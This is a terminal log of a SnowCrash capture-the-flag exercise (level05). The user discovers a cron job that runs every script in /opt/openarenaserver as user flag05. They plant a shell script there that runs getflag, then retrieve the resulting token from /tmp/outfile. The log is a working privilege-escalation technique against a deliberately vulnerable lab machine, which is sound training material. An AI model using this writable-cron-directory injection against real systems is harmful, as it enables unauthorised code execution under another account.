level05@SnowCrash:~$ cat /rofs/usr/lib/byobu/mail
#!/bin/sh -e
#
#    mail: notify the user if they have system mail
#
#    Copyright (C) 2009 Canonical Ltd.
#    Copyright (C) 2011 Dustin Kirkland
#
#    Authors: Dustin Kirkland <kirkland@ubuntu.com>
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, version 3 of the License.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.

MAILFILE="/var/spool/mail/$USER"

__mail_detail() {
        [ -s "$MAILFILE" ] && ls -alF "$MAILFILE" 2>&1
}

__mail() {
        if [ -s "$MAILFILE" ]; then
                 color b; printf "%s" "$ICON_MAIL"; color --
        fi
}

# vi: syntax=sh ts=4 noexpandtab
level05@SnowCrash:~$ find / -name cron 2>/dev/null
/etc/default/cron
/etc/init.d/cron
/etc/pam.d/cron
/usr/sbin/cron
/usr/share/bug/cron
/usr/share/doc/cron
/var/spool/cron
/rofs/etc/default/cron
/rofs/etc/init.d/cron
/rofs/etc/pam.d/cron
/rofs/usr/sbin/cron
/rofs/usr/share/bug/cron
/rofs/usr/share/doc/cron
/rofs/var/spool/cron
level05@SnowCrash:~$ find / -name cron -type f 2>/dev/null
/etc/default/cron
/etc/pam.d/cron
/usr/sbin/cron
/rofs/etc/default/cron
/rofs/etc/pam.d/cron
/rofs/usr/sbin/cron
level05@SnowCrash:~$ cat /etc/default/cron
# This file has been deprecated. Please add custom options for cron to
# /etc/init/cron.conf and/or /etc/init/cron.override directly. See
# the init(5) man page for more information.
level05@SnowCrash:~$ cat /etc/pam.d/cron
# The PAM configuration file for the cron daemon

@include common-auth

# Read environment variables from pam_env's default files, /etc/environment
# and /etc/security/pam_env.conf.
session       required   pam_env.so

# In addition, read system locale information
session       required   pam_env.so envfile=/etc/default/locale

@include common-account
@include common-session-noninteractive 

# Sets up user limits, please define limits for cron tasks
# through /etc/security/limits.conf
session    required   pam_limits.so

level05@SnowCrash:~$ ls
level05@SnowCrash:~$ find / -name mail 2>/dev/null
/usr/lib/byobu/mail
/var/mail
/var/spool/mail
/rofs/usr/lib/byobu/mail
/rofs/var/mail
/rofs/var/spool/mail
level05@SnowCrash:~$ cd /usr/lib/byobu/mail
-bash: cd: /usr/lib/byobu/mail: Not a directory
level05@SnowCrash:~$ cd /var/mail
level05@SnowCrash:/var/mail$ ls
level05
level05@SnowCrash:/var/mail$ cat level05 
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
level05@SnowCrash:/var/mail$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
level05@SnowCrash:/var/mail$ echo '#!/bin/sh\n/bin/sh getflag >> /tmp/outfile' >> /opt/openarenaserver/script.sh
level05@SnowCrash:/var/mail$ chmod + /opt/openarenaserver/script.sh 
level05@SnowCrash:/var/mail$ cat /tmp/outfile
cat: /tmp/outfile: No such file or directory
level05@SnowCrash:/var/mail$ cat /tmp/outfile
cat: /tmp/outfile: No such file or directory
level05@SnowCrash:/var/mail$ cat /tmp/outfile
cat: /tmp/outfile: No such file or directory
level05@SnowCrash:/var/mail$ cat /tmp/outfile
cat: /tmp/outfile: No such file or directory
level05@SnowCrash:/var/mail$ cat /tmp/outfile
cat: /tmp/outfile: No such file or directory
level05@SnowCrash:/var/mail$ cat /tmp/outfile
cat: /tmp/outfile: No such file or directory
level05@SnowCrash:/var/mail$ ls /opt/openarenaserver/
script.sh
level05@SnowCrash:/var/mail$ ls /opt/openarenaserver/
script.sh
level05@SnowCrash:/var/mail$ ls /opt/openarenaserver/
script.sh
level05@SnowCrash:/var/mail$ ls /opt/openarenaserver/
script.sh
level05@SnowCrash:/var/mail$ ls /opt/openarenaserver/
script.sh
level05@SnowCrash:/var/mail$ ls /opt/openarenaserver/
level05@SnowCrash:/var/mail$ cat /tmp/outfile
cat: /tmp/outfile: No such file or directory
level05@SnowCrash:/var/mail$ cat /tmp/outfile
cat: /tmp/outfile: No such file or directory
level05@SnowCrash:/var/mail$ echo '#!/bin/sh' > /opt/openarenaserver/script.sh
level05@SnowCrash:/var/mail$ echo 'getflag >> /tmp/outfile' >> /opt/openarenaserver/script.sh
level05@SnowCrash:/var/mail$ cat /opt/openarenaserver/script.sh
getflag >> /tmp/outfile
level05@SnowCrash:/var/mail$ echo '#!/bin/sh' > /opt/openarenaserver/script.sh
level05@SnowCrash:/var/mail$ echo 'getflag >> /tmp/outfile' >> /opt/openarenaserver/script.sh
level05@SnowCrash:/var/mail$ cat /opt/openarenaserver/script.sh#!/bin/sh
getflag >> /tmp/outfile
level05@SnowCrash:/var/mail$ chmod +x /opt/openarenaserver/script.sh
level05@SnowCrash:/var/mail$ cat /tmp/outfile
cat: /tmp/outfile: No such file or directory
level05@SnowCrash:/var/mail$ cat /tmp/outfile
cat: /tmp/outfile: No such file or directory
level05@SnowCrash:/var/mail$ cat /opt/openarenaserver/script.sh
#!/bin/sh
getflag >> /tmp/outfile
level05@SnowCrash:/var/mail$ cat /opt/openarenaserver/script.sh
#!/bin/sh
getflag >> /tmp/outfile
level05@SnowCrash:/var/mail$ cat /opt/openarenaserver/script.sh
#!/bin/sh
getflag >> /tmp/outfile
level05@SnowCrash:/var/mail$ cat /opt/openarenaserver/script.sh
cat: /opt/openarenaserver/script.sh: No such file or directory
level05@SnowCrash:/var/mail$ cat /tmp/outfile
Check flag.Here is your token : viuaaale9huek52boumoomioc
level05@SnowCrash:/var/mail$ 
